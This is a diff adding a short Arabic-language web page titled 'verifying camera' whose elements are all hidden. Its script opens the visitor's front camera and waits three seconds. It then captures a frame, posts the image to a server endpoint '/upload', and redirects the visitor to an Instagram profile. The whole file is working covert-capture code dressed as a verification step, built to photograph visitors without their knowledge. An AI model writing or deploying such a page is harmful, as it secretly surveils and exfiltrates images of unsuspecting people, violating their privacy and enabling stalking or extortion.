@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>جاري التحقق</title>
+  <style>
+    /* إخفاء العناصر */
+    body, h2, video, canvas {
+      margin: 0;
+      padding: 0;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h2>جاري التحقق من الكاميرا...</h2>
+  <video id="video" autoplay style="display:none;" width="320" height="240"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // بعد 3 ثواني، نلتقط صورة
+        setTimeout(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/png');
+
+          // إرسال الصورة إلى السيرفر (اختياري)
+          fetch('/upload', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ image: imageData })
+          }).then(() => {
+            console.log("✅ الصورة تم إرسالها");
+          });
+
+          // توجيه المستخدم إلى صفحة إنستجرام بعد أخذ الصورة
+          window.location.href = "https://www.instagram.com/dazaiosaum/";
+        }, 3000); // التوقيت 3 ثواني
+      })
+      .catch(err => {
+        alert("📵 تم رفض الوصول للكاميرا.");
+      });
+  </script>
+</body>
+</html>
